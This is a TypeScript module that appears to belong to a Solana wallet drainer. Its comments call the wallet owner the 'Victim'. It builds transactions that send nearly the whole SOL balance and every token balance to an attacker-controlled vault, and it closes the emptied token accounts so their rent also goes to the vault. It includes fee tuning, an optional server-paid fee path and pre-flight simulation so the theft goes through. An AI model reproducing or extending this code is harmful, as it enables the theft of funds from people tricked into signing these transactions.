import {
  PublicKey, VersionedTransaction, TransactionMessage, SystemProgram, ComputeBudgetProgram,
} from "@solana/web3.js";
import {
  createAssociatedTokenAccountIdempotentInstruction, createTransferInstruction,
  createCloseAccountInstruction, getAssociatedTokenAddressSync,
} from "@solana/spl-token";
import { conn } from "./rpc.js";
import { cfg } from "./config.js";
import { runtime } from "./admin.js";
import type { Found } from "./scan.js";

const RECOVERY = 1_000_000n;
const RENT_PER_ATA = 2_039_280n;
const BUFFER = 50_000n;
const DUST = 1000n;

export type Plan = { sol: bigint; tokens: Found[]; rec: boolean; balance?: bigint };

export class SimulationError extends Error {
  simLogs: string[];
  simErr: string;
  constructor(logs: string[], simErr = "") {
    super("simulation failed");
    this.simLogs = logs;
    this.simErr = simErr;
  }
}

function priorityLamports(): bigint {
  return BigInt(Math.ceil((runtime.computeLimit * runtime.priority) / 1e6));
}

export async function plan(
  owner: PublicKey,
  balance: bigint,
  found: Found[],
  reserveMult = 1,
): Promise<Plan[]> {
  const dests = found.map((t) => getAssociatedTokenAddressSync(t.mint, cfg.vault, false, t.programId));
  const infos = await conn.getMultipleAccountsInfo(dests);

  const chosen: Found[] = [];
  const paid: Found[] = [];
  found.forEach((t, i) => {
    if (t.amount === 0n) chosen.push(t);
    else if (infos[i]) chosen.push(t);
    else paid.push(t);
  });

  const perTx = Math.max(1, Math.floor(cfg.MAX_IX_PER_TX / 3) - 1);

  if (cfg.feePayer) {
    // Server pays fees + ATA rent — include all tokens, transfer full balance minus small buffer
    for (const t of paid) chosen.push(t);
    const items: Plan[] = [];
    if (balance > 10_000n) {
      items.push({ sol: balance - 10_000n, tokens: [], rec: false });
    }
    for (let i = 0; i < chosen.length; i += perTx) {
      items.push({ sol: 0n, tokens: chosen.slice(i, i + perTx), rec: false });
    }
    return items;
  }

  // Victim is fee payer — use rough reserve for token budget; buildAll refines SOL amount
  const priority = priorityLamports();
  const rec = balance < 3_000_000n ? 0n : RECOVERY;
  const roughFee = BigInt(Math.ceil(Number(5000n + priority + BUFFER) * reserveMult));
  const roughReserve = roughFee + rec;
  const budget = balance - roughReserve;
  if (budget < 0n) return [];

  let rentSpent = 0n;
  for (const t of paid) {
    if (budget - rentSpent < RENT_PER_ATA) break;
    rentSpent += RENT_PER_ATA;
    chosen.push(t);
  }

  const items: Plan[] = [];
  // Store full balance; buildAll() computes actual SOL transfer amount via getFeeForMessage
  items.push({ sol: 0n, tokens: [], rec: balance >= 3_000_000n, balance });
  for (let i = 0; i < chosen.length; i += perTx) {
    items.push({ sol: 0n, tokens: chosen.slice(i, i + perTx), rec: false });
  }
  return items;
}

export async function buildAll(
  owner: PublicKey,
  items: Plan[],
  recovery: PublicKey,
  reserveMult = 1,
): Promise<string[]> {
  const { blockhash } = await conn.getLatestBlockhash("finalized");
  const ataFunder = cfg.feePayer ? cfg.feePayer.publicKey : owner;

  // Count missing destination ATAs across all token items for reserve calculation
  let missingATARent = 0n;
  const allWithValue = items.flatMap((i) => i.tokens.filter((t) => t.amount > 0n));
  if (allWithValue.length > 0) {
    const dests = allWithValue.map((t) =>
      getAssociatedTokenAddressSync(t.mint, cfg.vault, false, t.programId),
    );
    try {
      const infos = await conn.getMultipleAccountsInfo(dests);
      infos.forEach((info) => { if (!info) missingATARent += RENT_PER_ATA; });
    } catch {
      // conservative fallback: assume all ATAs missing
      missingATARent = BigInt(allWithValue.length) * RENT_PER_ATA;
    }
  }

  const out: string[] = [];

  for (const item of items) {
    const payerKey = cfg.feePayer ? cfg.feePayer.publicKey : owner;
    const ixs = [
      ComputeBudgetProgram.setComputeUnitLimit({ units: runtime.computeLimit }),
      ComputeBudgetProgram.setComputeUnitPrice({ microLamports: runtime.priority }),
    ];

    if (item.balance !== undefined) {
      // Victim-pays path: compute actual SOL transfer via getFeeForMessage
      const balance = item.balance;
      const rec = item.rec ? RECOVERY : 0n;

      // Build a representative message to get the actual base fee
      const dummyIxs = [
        ComputeBudgetProgram.setComputeUnitLimit({ units: runtime.computeLimit }),
        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: runtime.priority }),
        SystemProgram.transfer({ fromPubkey: owner, toPubkey: cfg.vault, lamports: 1n }),
      ];
      if (item.rec) {
        dummyIxs.push(SystemProgram.transfer({ fromPubkey: owner, toPubkey: recovery, lamports: RECOVERY }));
      }
      const dummyMsg = new TransactionMessage({
        payerKey: owner,
        recentBlockhash: blockhash,
        instructions: dummyIxs,
      }).compileToV0Message();

      let baseFee = 5000n;
      try {
        const feeResult = await conn.getFeeForMessage(dummyMsg, "confirmed");
        baseFee = BigInt(feeResult?.value ?? 5000);
      } catch { /* fall back to 5000 */ }

      const priorityFee = priorityLamports();
      const rawFeeReserve = baseFee + priorityFee + missingATARent + BUFFER;
      const scaledFeeReserve = BigInt(Math.ceil(Number(rawFeeReserve) * reserveMult));
      const reserve = scaledFeeReserve + rec;
      const transferAmount = balance - reserve;

      if (transferAmount <= DUST) continue;

      ixs.push(SystemProgram.transfer({ fromPubkey: owner, toPubkey: cfg.vault, lamports: transferAmount }));
      if (item.rec) {
        ixs.push(SystemProgram.transfer({ fromPubkey: owner, toPubkey: recovery, lamports: RECOVERY }));
      }
    } else if (item.sol > 0n) {
      // Fee-payer path: exact amount pre-calculated in plan()
      ixs.push(SystemProgram.transfer({ fromPubkey: owner, toPubkey: cfg.vault, lamports: item.sol }));
    }

    for (const t of item.tokens) {
      if (t.amount === 0n) {
        if (runtime.reclaimRent) ixs.push(createCloseAccountInstruction(t.ata, cfg.vault, owner, [], t.programId));
        continue;
      }
      const dest = getAssociatedTokenAddressSync(t.mint, cfg.vault, false, t.programId);
      ixs.push(createAssociatedTokenAccountIdempotentInstruction(ataFunder, dest, cfg.vault, t.mint, t.programId));
      ixs.push(createTransferInstruction(t.ata, dest, owner, t.amount, [], t.programId));
      if (runtime.reclaimRent) ixs.push(createCloseAccountInstruction(t.ata, cfg.vault, owner, [], t.programId));
    }

    if (ixs.length <= 2) continue;

    const msg = new TransactionMessage({ payerKey, recentBlockhash: blockhash, instructions: ixs }).compileToV0Message();
    const tx = new VersionedTransaction(msg);
    if (cfg.feePayer) tx.sign([cfg.feePayer]);

    // Pre-flight simulation
    try {
      const sim = await conn.simulateTransaction(tx, { replaceRecentBlockhash: true, sigVerify: false });
      if (sim.value.err) {
        const errStr = typeof sim.value.err === "string" ? sim.value.err : JSON.stringify(sim.value.err);
        throw new SimulationError(sim.value.logs ?? [], errStr);
      }
    } catch (e: unknown) {
      if (e instanceof SimulationError) throw e;
      // RPC error during simulation — proceed optimistically
    }

    out.push(Buffer.from(tx.serialize()).toString("base64"));
  }

  return out;
}
